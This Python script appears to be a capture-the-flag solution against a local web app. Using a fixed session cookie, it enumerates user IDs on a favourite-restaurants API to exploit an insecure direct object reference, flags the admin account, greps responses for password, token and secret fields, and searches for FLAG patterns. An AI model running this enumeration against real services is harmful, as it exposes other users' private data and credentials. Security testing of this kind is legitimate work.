import requests
import json
import re
from datetime import datetime

BASE_URL = "http://127.0.0.1:33156"
API_ENDPOINT = "/api/get_favorite_restaurants.php"

# Store results
results = {
    'auth_check': None,
    'responses': [],
    'flags_found': [],
    'admin_data': None,
    'sensitive_data': []
}

print("=" * 80)
print("API ENUMERATION AND SECURITY TEST")
print(f"Target: {BASE_URL}{API_ENDPOINT}")
print("=" * 80)

# Step 1: Test authentication requirement
print("\n[1] Testing authentication requirement (no cookie)...")
url = f"{BASE_URL}{API_ENDPOINT}?userId=1"
try:
    resp_no_auth = requests.get(url, timeout=10)
    results['auth_check'] = {
        'status_code': resp_no_auth.status_code,
        'headers': dict(resp_no_auth.headers),
        'body': resp_no_auth.text,
        'content_length': len(resp_no_auth.content)
    }
    
    print(f"[+] Response Status: {resp_no_auth.status_code}")
    print(f"[+] Content Length: {len(resp_no_auth.content)} bytes")
    print(f"[+] Response Body: {resp_no_auth.text}")
    
    # Check if authentication is required
    auth_required = resp_no_auth.status_code in [401, 403] or "unauthorized" in resp_no_auth.text.lower() or "login" in resp_no_auth.text.lower()
    
    if auth_required:
        print("[!] Authentication appears to be required")
    else:
        print("[+] No authentication required - proceeding with enumeration")
        
except Exception as e:
    print(f"[-] Error during auth check: {e}")
    auth_required = False

# Step 2: Prepare session with cookie
session = requests.Session()
cookie = {"PHPSESSID": "j2jbue9ik42nla625rupl7v2jk"}
session.cookies.update(cookie)
print(f"\n[2] Using PHPSESSID: {cookie['PHPSESSID']}")
print(f"[2] Cookie jar: {dict(session.cookies)}")

# Step 3: Enumerate userIds 1-20
print("\n[3] Enumerating userIds 1-20...")
print("-" * 80)

for user_id in range(1, 21):
    url = f"{BASE_URL}{API_ENDPOINT}?userId={user_id}"
    
    try:
        response = session.get(url, timeout=10)
        
        response_data = {
            'user_id': user_id,
            'url': url,
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'body': response.text,
            'content_length': len(response.content),
            'timestamp': datetime.now().isoformat()
        }
        
        results['responses'].append(response_data)
        
        print(f"\n[User ID: {user_id:2d}] | Status: {response.status_code:3d} | Length: {len(response.content):4d} bytes")
        print(f"URL: {url}")
        
        # Parse JSON if possible
        try:
            json_data = response.json()
            print(f"JSON Response: {json.dumps(json_data, indent=2)}")
            
            # Search for admin indicators
            if user_id == 7:
                print(f"[!] ADMIN USER (userId=7) - Data: {json.dumps(json_data, indent=2)}")
                results['admin_data'] = {
                    'user_id': user_id,
                    'data': json_data
                }
                
            # Check for sensitive fields
            sensitive_keywords = ['password', 'hint', 'secret', 'token', 'admin', 'role', 'privilege', 'access']
            
            def search_sensitive(obj, path=""):
                if isinstance(obj, dict):
                    for key, value in obj.items():
                        current_path = f"{path}.{key}" if path else key
                        
                        # Check if any keyword is in the field name (case-insensitive)
                        for keyword in sensitive_keywords:
                            if keyword.lower() in key.lower():
                                print(f"[!] SENSITIVE FIELD FOUND: {current_path} = {value}")
                                results['sensitive_data'].append({
                                    'user_id': user_id,
                                    'field': current_path,
                                    'value': value,
                                    'keyword': keyword
                                })
                        
                        # Recursively search nested structures
                        search_sensitive(value, current_path)
                        
                elif isinstance(obj, list):
                    for idx, item in enumerate(obj):
                        search_sensitive(item, f"{path}[{idx}]")
            
            search_sensitive(json_data)
            
        except ValueError:
            print(f"Response: {response.text[:200]}{'...' if len(response.text) > 200 else ''}")
        
        # Step 4: Search for FLAG patterns
        flag_pattern = r'FLAG\{[^}]+\}'
        flags = re.findall(flag_pattern, response.text)
        
        if flags:
            print(f"[!!!] FLAG(S) FOUND IN USER {user_id} RESPONSE:")
            for flag in flags:
                print(f"  -> {flag}")
                results['flags_found'].append({
                    'user_id': user_id,
                    'flag': flag,
                    'context': response.text
                })
        
    except Exception as e:
        print(f"[-] Error for userId {user_id}: {e}")
        results['responses'].append({
            'user_id': user_id,
            'error': str(e),
            'timestamp': datetime.now().isoformat()
        })

# Step 5: Comprehensive report
print("\n" + "=" * 80)
print("COMPREHENSIVE SECURITY REPORT")
print("=" * 80)

print(f"\n[AUTHENTICATION]")
if results['auth_check']:
    print(f"  Status Check Response: {results['auth_check']['status_code']}")
    print(f"  Authentication Required: {auth_required}")
    print(f"  Using Session Cookie: {cookie}")

print(f"\n[FLAGS FOUND] ({len(results['flags_found'])} total)")
if results['flags_found']:
    for item in results['flags_found']:
        print(f"  User ID {item['user_id']}: {item['flag']}")
else:
    print("  No FLAG{...} patterns found in responses")

print(f"\n[ADMIN ACCOUNT] (User ID 7)")
if results['admin_data']:
    print(f"  Admin User Response Code: {results['admin_data']['data']}")
else:
    print("  User ID 7 not found or no data returned")

print(f"\n[SENSITIVE DATA DISCOVERED] ({len(results['sensitive_data'])} fields)")
for item in results['sensitive_data']:
    print(f"  User {item['user_id']}: Field '{item['field']}' contains '{item['value']}' (keyword: {item['keyword']})")

print(f"\n[RESPONSE SUMMARY]")
successful_responses = [r for r in results['responses'] if 'error' not in r]
failed_requests = [r for r in results['responses'] if 'error' in r]
print(f"  Total IDs Tested: 20")
print(f"  Successful Responses: {len(successful_responses)}")
print(f"  Failed Requests: {len(failed_requests)}")

# Print unique status codes
status_codes = [r['status_code'] for r in successful_responses]
for code in sorted(set(status_codes)):
    count = status_codes.count(code)
    print(f"    Status {code}: {count} responses")

print(f"\n[DETAILED RESPONSE LENGTHS]")
for resp in successful_responses:
    data_preview = resp['body'][:100].replace('\n', ' ')
    print(f"  User {resp['user_id']}: {resp['content_length']} bytes | {data_preview}...")

print("\n" + "=" * 80)
print("END OF SECURITY REPORT")
print("=" * 80)

# Save raw results for further analysis
print(f"\n[SAVING RESULTS]")
print(f"Full data structure contains {len(results['responses'])} response records")
print(f"Raw JSON data available for export if needed")
